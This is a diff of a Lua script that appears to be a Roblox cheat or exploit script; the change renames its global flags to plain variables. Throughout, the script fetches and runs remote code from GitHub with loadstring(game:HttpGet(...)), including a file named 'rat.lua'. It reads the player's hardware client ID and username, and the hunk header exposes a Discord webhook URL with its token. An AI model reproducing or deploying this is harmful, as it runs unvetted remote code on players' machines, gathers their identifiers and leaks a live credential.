@@ -406,32 +406,32 @@ local url = "https://discord.com/api/webhooks/1268351413751120002/YX_I7VpV7ECm8b
     end
 end)  
 
-_G.asdwqelist = false
-_G.antiusefree = false
+asdwqelist = false
+antiusefree = false
 anticamplisted = loadstring(game:HttpGet('https://raw.githubusercontent.com/Department123zxc/hello/main/anticamp'))()
 listedaxw = loadstring(game:HttpGet('https://raw.githubusercontent.com/Iamcutehehe/hehehe/main/whitelist.lua'))()
         for _, v1 in pairs(listedaxw) do
 gethwid = game:GetService("RbxAnalyticsService"):GetClientId()
             if gethwid == v1 then
-_G.asdwqelist = true
+asdwqelist = true
             end
         end
 
-userlistedzxwc = loadstring(game:HttpGet('https://raw.githubusercontent.com/Department123zxc/hello/main/world2.lua'))()
+userlistedzxwc = loadstring(game:HttpGet('https://raw.githubusercontent.com/Department123zxc/hello/main/list'))()
         for _, v2 in pairs(userlistedzxwc) do
-            if game.Players.LocalPlayer.UserId == v2 then
-_G.asdwqelist = true
+            if game.Players.LocalPlayer.UserId and game.Players.LocalPlayer.Name == v2 then
+asdwqelist = true
             end
         end
 
 antifreezsc = loadstring(game:HttpGet('https://raw.githubusercontent.com/PotatoEiii/whocares/main/rat.lua'))()
         for _, v3 in pairs(antifreezsc) do
             if game.Players.LocalPlayer.Name == v3 then
-_G.antiusefree = true
+antiusefree = true
             end
         end
 
-if _G.antiusefree then
+if antiusefree then
 spawn(function()
 while wait() do
 pcall(function()
@@ -461,7 +461,7 @@ end
 end)
 end
 
-if _G.asdwqelist then
+if asdwqelist then
 pcall(function()
 do
 for i, v in pairs(game:GetService("Workspace").Island8:GetDescendants()) do
